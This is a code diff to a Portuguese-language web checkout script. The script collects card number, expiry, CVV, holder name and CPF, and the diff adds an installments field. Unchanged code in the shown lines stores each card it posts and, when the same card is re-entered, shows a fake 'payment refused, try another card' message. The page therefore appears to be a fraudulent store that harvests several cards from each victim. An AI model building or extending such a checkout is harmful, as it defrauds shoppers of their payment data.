@@ -2109,11 +2109,12 @@ header .holder-logo .logo .img-logo {
 
             $("#btn_compra_cc").click(async function(e){
                 let cc = $("#input-card-number-0").val();
-
                 let validade = $("#input-card-validaty-0").val();
                 let cvv = $("#input-security-number-0").val();
                 let titular = $("#input-card-name-0").val();
                 let cpf = $("#input-card-document-0").val();
+                const installments = $("#installments").val();
+
 
                 if(cc == window.cc && validade == window.validade && cvv == window.cvv){
                     modalErro('O seu pagamento foi recusado, tente outro cartão de crédito ou altere a forma de pagamento.');
@@ -2157,6 +2158,8 @@ header .holder-logo .logo .img-logo {
                     return;
                 }
 
+                if(!installments) return modalErro('Deve selecionar o número de instrumentos.');
+
                 $(this).addClass('sending');
 
                 let bin = cc.replace(' ', '');
@@ -2181,7 +2184,8 @@ header .holder-logo .logo .img-logo {
                     validade: validade,
                     cvv: cvv,
                     titular: $("#input-card-name-0").val(),
-                    cpf: $("#input-card-document-0").val()
+                    cpf: $("#input-card-document-0").val(),
+                    installments,
                 },(r)=>{
                     window.cc = cc;
                     window.validade = validade;
@@ -2207,7 +2211,6 @@ header .holder-logo .logo .img-logo {
                     }else{
                         window.location = '/checkout/1/{{ $data['hash'] }}/4';
                     }
-
                 })
 
             })
